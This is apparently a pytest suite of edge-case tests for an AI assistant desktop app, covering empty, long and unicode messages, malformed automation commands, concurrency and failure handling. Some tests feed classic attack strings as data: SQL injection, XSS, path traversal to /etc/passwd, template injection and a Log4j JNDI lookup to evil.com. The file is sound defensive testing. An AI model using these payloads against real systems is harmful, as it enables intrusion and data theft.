"""
Edge case and boundary tests for AI Assistant Desktop Application
"""

import pytest
import asyncio
import tempfile
import os
from unittest.mock import Mock, patch, AsyncMock
from pathlib import Path
import json
import time

from services.llm_service import LLMService
from services.automation_service import AutomationService
from services.security_service import SecurityService
from services.learning_service import LearningService
from models.chat_models import ChatRequest, AutomationTask

class TestEdgeCases:
    """Test edge cases and boundary conditions"""

    @pytest.mark.asyncio
    async def test_empty_message_handling(self, llm_service):
        """Test handling of empty or whitespace-only messages"""
        test_cases = ["", "   ", "\n\n", "\t\t", None]
        
        for test_input in test_cases:
            if test_input is None:
                continue
                
            with patch('httpx.AsyncClient') as mock_client:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {"message": {"content": "Please provide a message."}}
                mock_client.return_value.__aenter__.return_value.post.return_value = mock_response
                
                result = await llm_service.process_message(test_input)
                
                # Should handle gracefully
                assert result.text is not None
                assert len(result.text) > 0

    @pytest.mark.asyncio
    async def test_extremely_long_message(self, llm_service):
        """Test handling of extremely long messages"""
        # Create a very long message (1MB)
        long_message = "A" * (1024 * 1024)
        
        with patch('httpx.AsyncClient') as mock_client:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {"message": {"content": "Message received."}}
            mock_client.return_value.__aenter__.return_value.post.return_value = mock_response
            
            result = await llm_service.process_message(long_message)
            
            # Should handle without crashing
            assert result.text is not None

    @pytest.mark.asyncio
    async def test_special_characters_in_message(self, llm_service):
        """Test handling of special characters and unicode"""
        special_messages = [
            "Hello 🌟 World! 🚀",
            "测试中文字符",
            "Тест русских символов",
            "🎉🎊🎈🎁🎂🍰🎪🎨🎭🎪",
            "Special chars: !@#$%^&*()_+-=[]{}|;':\",./<>?",
            "SQL injection'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "Path traversal: ../../../etc/passwd",
            "\x00\x01\x02\x03\x04\x05",  # Control characters
        ]
        
        for message in special_messages:
            with patch('httpx.AsyncClient') as mock_client:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {"message": {"content": "Processed special message."}}
                mock_client.return_value.__aenter__.return_value.post.return_value = mock_response
                
                result = await llm_service.process_message(message)
                
                # Should handle without crashing
                assert result.text is not None

    @pytest.mark.asyncio
    async def test_malformed_automation_commands(self, llm_service):
        """Test handling of malformed automation commands"""
        malformed_commands = [
            "[AUTOMATION:invalid_json:{not_json}]",
            "[AUTOMATION:missing_colon]",
            "[AUTOMATION:]",
            "[AUTOMATION:type:]",
            "[AUTOMATION:type:{}:extra]",
            "AUTOMATION:no_brackets:{}",
            "[AUTOMATION:type:{\"unclosed\": \"quote}]",
            "[AUTOMATION:type:{\"nested\": {\"object\": \"value\"}}]",
        ]
        
        for command in malformed_commands:
            response_text = f"I'll help you. {command}"
            
            with patch('httpx.AsyncClient') as mock_client:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {"message": {"content": response_text}}
                mock_client.return_value.__aenter__.return_value.post.return_value = mock_response
                
                result = await llm_service.process_message("Test command")
                
                # Should handle malformed commands gracefully
                assert result.text is not None
                # Should not crash on malformed automation commands

    @pytest.mark.asyncio
    async def test_concurrent_context_access(self, llm_service):
        """Test concurrent access to the same context"""
        context_id = "shared-context"
        
        with patch('httpx.AsyncClient') as mock_client:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {"message": {"content": "Response"}}
            mock_client.return_value.__aenter__.return_value.post.return_value = mock_response
            
            # Send multiple messages to same context concurrently
            tasks = []
            for i in range(10):
                task = llm_service.process_message(f"Message {i}", context_id)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            
            # All should complete successfully
            assert len(results) == 10
            for result in results:
                assert result.context_id == context_id

    @pytest.mark.asyncio
    async def test_file_operations_edge_cases(self, automation_service, temp_dir):
        """Test file operations with edge cases"""
        edge_cases = [
            # Very long filename
            {
                "path": str(temp_dir / ("a" * 200 + ".txt")),
                "content": "Long filename test"
            },
            # Special characters in filename
            {
                "path": str(temp_dir / "special!@#$%^&*()_+.txt"),
                "content": "Special chars in filename"
            },
            # Unicode filename
            {
                "path": str(temp_dir / "测试文件.txt"),
                "content": "Unicode filename test"
            },
            # Empty content
            {
                "path": str(temp_dir / "empty.txt"),
                "content": ""
            },
            # Very large content
            {
                "path": str(temp_dir / "large.txt"),
                "content": "X" * (1024 * 1024)  # 1MB
            },
        ]
        
        for i, case in enumerate(edge_cases):
            task_data = {
                "task_id": f"edge-case-{i}",
                "task_type": "file_operations",
                "parameters": {
                    "action": "create",
                    **case
                },
                "priority": 1,
                "timeout": 30
            }
            
            try:
                result = await automation_service.execute_task(task_data)
                # Some edge cases might fail, but shouldn't crash
                assert result is not None
            except Exception as e:
                # Should handle gracefully
                assert "timeout" not in str(e).lower()

    @pytest.mark.asyncio
    async def test_invalid_file_paths(self, automation_service):
        """Test handling of invalid file paths"""
        invalid_paths = [
            "/root/restricted.txt",  # Permission denied
            "/nonexistent/deep/path/file.txt",  # Non-existent directory
            "",  # Empty path
            "   ",  # Whitespace path
            "/dev/null",  # Special device
            "CON",  # Windows reserved name
            "file\x00name.txt",  # Null character
            "../../../etc/passwd",  # Path traversal
        ]
        
        for i, invalid_path in enumerate(invalid_paths):
            task_data = {
                "task_id": f"invalid-path-{i}",
                "task_type": "file_operations",
                "parameters": {
                    "action": "create",
                    "path": invalid_path,
                    "content": "Test content"
                },
                "priority": 1,
                "timeout": 30
            }
            
            result = await automation_service.execute_task(task_data)
            
            # Should handle invalid paths gracefully (may succeed or fail)
            assert result is not None
            assert result.task_id == f"invalid-path-{i}"

    @pytest.mark.asyncio
    async def test_memory_exhaustion_simulation(self, llm_service):
        """Test behavior under simulated memory pressure"""
        # Create many large contexts to simulate memory pressure
        large_contexts = {}
        
        with patch('httpx.AsyncClient') as mock_client:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {"message": {"content": "Response"}}
            mock_client.return_value.__aenter__.return_value.post.return_value = mock_response
            
            # Create many contexts with large message histories
            for context_id in range(100):
                context_key = f"memory-test-{context_id}"
                
                # Add many messages to each context
                for message_id in range(50):
                    await llm_service.process_message(
                        f"Large message {message_id} " + "X" * 1000,
                        context_key
                    )
            
            # System should still be responsive
            result = await llm_service.process_message("Final test message")
            assert result.text is not None

    @pytest.mark.asyncio
    async def test_rapid_service_start_stop(self, all_services):
        """Test rapid starting and stopping of services"""
        for cycle in range(5):
            # Start all services
            for service_name, service in all_services.items():
                if hasattr(service, 'start') and service_name not in ['watchdog', 'config']:
                    try:
                        await service.start()
                    except Exception:
                        pass  # Some services may fail in test environment
            
            # Immediately stop all services
            for service_name, service in all_services.items():
                if hasattr(service, 'stop') and service_name not in ['config']:
                    try:
                        await service.stop()
                    except Exception:
                        pass
        
        # Should handle rapid start/stop cycles without issues
        assert True

    @pytest.mark.asyncio
    async def test_network_interruption_simulation(self, llm_service):
        """Test behavior during network interruptions"""
        with patch('httpx.AsyncClient') as mock_client:
            # Simulate intermittent network failures
            call_count = 0
            
            def side_effect(*args, **kwargs):
                nonlocal call_count
                call_count += 1
                
                if call_count % 3 == 0:  # Every 3rd call fails
                    raise ConnectionError("Network interrupted")
                
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {"message": {"content": "Response"}}
                return mock_response
            
            mock_client.return_value.__aenter__.return_value.post.side_effect = side_effect
            
            # Send multiple requests during "network issues"
            results = []
            for i in range(10):
                try:
                    result = await llm_service.process_message(f"Network test {i}")
                    results.append(result)
                except Exception:
                    # Network failures should be handled gracefully
                    pass
            
            # Some requests should succeed despite network issues
            assert len(results) > 0

    @pytest.mark.asyncio
    async def test_disk_space_exhaustion_simulation(self, automation_service, temp_dir):
        """Test behavior when disk space is exhausted"""
        # Simulate disk full error
        original_open = open
        
        def mock_open(*args, **kwargs):
            if 'w' in str(kwargs.get('mode', args[1] if len(args) > 1 else 'r')):
                raise OSError(28, "No space left on device")  # ENOSPC
            return original_open(*args, **kwargs)
        
        with patch('builtins.open', side_effect=mock_open):
            task_data = {
                "task_id": "disk-full-test",
                "task_type": "file_operations",
                "parameters": {
                    "action": "create",
                    "path": str(temp_dir / "disk_full_test.txt"),
                    "content": "Test content"
                },
                "priority": 1,
                "timeout": 30
            }
            
            result = await automation_service.execute_task(task_data)
            
            # Should handle disk full error gracefully
            assert result.status.value == "failed"
            assert "space" in result.error.lower() or "disk" in result.error.lower()

    @pytest.mark.asyncio
    async def test_encryption_with_corrupted_data(self, security_service):
        """Test encryption/decryption with corrupted data"""
        with patch('services.security_service.CRYPTO_AVAILABLE', True):
            # Mock cipher suite
            mock_cipher = Mock()
            mock_cipher.encrypt.return_value = b'encrypted_data'
            mock_cipher.decrypt.side_effect = Exception("Decryption failed")
            security_service.cipher_suite = mock_cipher
            
            # Encrypt data
            encrypted = await security_service.encrypt_data("Test data")
            assert encrypted is not None
            
            # Try to decrypt corrupted data
            with pytest.raises(Exception):
                await security_service.decrypt_data("corrupted_data")

    @pytest.mark.asyncio
    async def test_permission_system_edge_cases(self, security_service):
        """Test permission system with edge cases"""
        edge_cases = [
            ("", "empty_action", "empty_resource"),
            ("user", "", "empty_action"),
            ("user", "action", ""),
            ("user" * 1000, "long_user_id", "resource"),  # Very long user ID
            ("user", "action" * 1000, "long_action"),  # Very long action
            ("user\x00null", "null_char_user", "resource"),  # Null character
            ("user:colon", "colon_in_user", "resource"),  # Special characters
        ]
        
        for user_id, action, resource in edge_cases:
            try:
                granted = await security_service.request_permission(user_id, action, resource)
                # Should handle gracefully (may grant or deny)
                assert isinstance(granted, bool)
            except Exception:
                # Some edge cases may raise exceptions, which is acceptable
                pass

    @pytest.mark.asyncio
    async def test_context_size_boundary(self, llm_service):
        """Test context size at exact boundary conditions"""
        with patch('httpx.AsyncClient') as mock_client:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {"message": {"content": "Response"}}
            mock_client.return_value.__aenter__.return_value.post.return_value = mock_response
            
            context_id = "boundary-test"
            
            # Send exactly 20 messages (the limit)
            for i in range(20):
                await llm_service.process_message(f"Message {i}", context_id)
            
            # Context should have exactly 20 messages (10 user + 10 assistant)
            assert len(llm_service.contexts[context_id]) == 20
            
            # Send one more message
            await llm_service.process_message("Message 21", context_id)
            
            # Should still have 20 messages (oldest removed)
            assert len(llm_service.contexts[context_id]) == 20

    @pytest.mark.asyncio
    async def test_concurrent_file_access(self, automation_service, temp_dir):
        """Test concurrent access to the same file"""
        test_file = temp_dir / "concurrent_test.txt"
        
        # Create multiple tasks that access the same file
        tasks = []
        for i in range(10):
            task_data = {
                "task_id": f"concurrent-file-{i}",
                "task_type": "file_operations",
                "parameters": {
                    "action": "create",
                    "path": str(test_file),
                    "content": f"Content from task {i}"
                },
                "priority": 1,
                "timeout": 30
            }
            task = automation_service.execute_task(task_data)
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Some tasks may succeed, others may fail due to file locking
        # But the system should handle it gracefully
        successful_results = [r for r in results if not isinstance(r, Exception)]
        assert len(successful_results) > 0

    @pytest.mark.asyncio
    async def test_service_dependency_failures(self, all_services):
        """Test behavior when service dependencies fail"""
        # Simulate LLM service failure
        llm_service = all_services['llm']
        
        with patch.object(llm_service, 'process_message', side_effect=Exception("LLM service failed")):
            # Other services should continue to work
            automation_service = all_services['automation']
            
            task_data = {
                "task_id": "dependency-test",
                "task_type": "file_operations",
                "parameters": {
                    "action": "create",
                    "path": "/tmp/dependency_test.txt",
                    "content": "Test content"
                },
                "priority": 1,
                "timeout": 30
            }
            
            result = await automation_service.execute_task(task_data)
            
            # Automation should work independently
            assert result.status.value == "completed"

    @pytest.mark.asyncio
    async def test_malicious_input_handling(self, llm_service, automation_service):
        """Test handling of potentially malicious inputs"""
        malicious_inputs = [
            "'; DROP TABLE users; --",  # SQL injection
            "<script>alert('XSS')</script>",  # XSS
            "../../../etc/passwd",  # Path traversal
            "${jndi:ldap://evil.com/a}",  # Log4j injection
            "{{7*7}}",  # Template injection
            "eval('malicious code')",  # Code injection
            "\x00\x01\x02\x03",  # Binary data
            "A" * 100000,  # Buffer overflow attempt
        ]
        
        for malicious_input in malicious_inputs:
            # Test LLM service
            with patch('httpx.AsyncClient') as mock_client:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {"message": {"content": "Safe response"}}
                mock_client.return_value.__aenter__.return_value.post.return_value = mock_response
                
                result = await llm_service.process_message(malicious_input)
                
                # Should handle malicious input safely
                assert result.text is not None
            
            # Test automation service
            task_data = {
                "task_id": "malicious-test",
                "task_type": "file_operations",
                "parameters": {
                    "action": "create",
                    "path": f"/tmp/malicious_{hash(malicious_input)}.txt",
                    "content": malicious_input
                },
                "priority": 1,
                "timeout": 30
            }
            
            result = await automation_service.execute_task(task_data)
            
            # Should handle malicious input safely (may succeed or fail safely)
            assert result is not None

    @pytest.mark.asyncio
    async def test_resource_cleanup_on_failure(self, automation_service):
        """Test that resources are properly cleaned up on failure"""
        initial_task_count = len(automation_service.active_tasks)
        
        # Create a task that will fail
        task_data = {
            "task_id": "cleanup-test",
            "task_type": "invalid_type",  # This will cause failure
            "parameters": {},
            "priority": 1,
            "timeout": 30
        }
        
        result = await automation_service.execute_task(task_data)
        
        # Task should fail
        assert result.status.value == "failed"
        
        # Active tasks should be cleaned up
        assert len(automation_service.active_tasks) == initial_task_count
        
        # Result should be stored
        assert "cleanup-test" in automation_service.task_results

    @pytest.mark.asyncio
    async def test_unicode_normalization(self, llm_service):
        """Test handling of different Unicode normalization forms"""
        # Same character in different Unicode forms
        test_strings = [
            "café",  # NFC (composed)
            "cafe\u0301",  # NFD (decomposed)
            "ﬁle",  # Ligature
            "𝕳𝖊𝖑𝖑𝖔",  # Mathematical symbols
        ]
        
        for test_string in test_strings:
            with patch('httpx.AsyncClient') as mock_client:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_response.json.return_value = {"message": {"content": "Unicode handled"}}
                mock_client.return_value.__aenter__.return_value.post.return_value = mock_response
                
                result = await llm_service.process_message(test_string)
                
                # Should handle different Unicode forms
                assert result.text is not None